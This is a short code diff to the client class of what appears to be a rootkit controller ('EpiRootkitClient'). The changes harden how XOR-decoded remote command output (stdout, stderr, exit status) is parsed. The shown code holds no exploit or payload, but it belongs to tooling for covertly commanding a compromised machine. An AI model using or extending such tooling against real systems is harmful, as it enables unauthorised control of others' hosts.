@@ -131,8 +131,10 @@ class EpiRootkitClient:
             if not chunk:
                 print("[ERROR] Disconnected.")
                 return {'stdout': [], 'stderr': [], 'status': -1}
+
             text = xor_encrypt_decrypt(chunk).decode(errors="ignore")
             buffer += text
+
             if EOF_MARKER in buffer:
                 break
 
@@ -142,15 +144,17 @@ class EpiRootkitClient:
             if STATUS_MARKER in rest:
                 stderr_part, status_part = rest.split(STATUS_MARKER, 1)
             else:
-                stderr_part, status_part = rest, ""
+                stderr_part, status_part = rest, "-1"
         else:
-            stdout_part, stderr_part, status_part = parts, "", ""
+            stdout_part, stderr_part, status_part = parts, "", "-1"
 
-        stdout = stdout_part.strip().splitlines()
-        stderr = stderr_part.strip().splitlines()
+        stdout = stdout_part.strip().splitlines() if stdout_part.strip() else []
+        stderr = stderr_part.strip().splitlines() if stderr_part.strip() else []
+
         try:
             status = int(status_part.strip())
         except ValueError:
+            logging.warning("Invalid status value: '%s'", status_part.strip())
             status = -1
 
         return {'stdout': stdout, 'stderr': stderr, 'status': status}
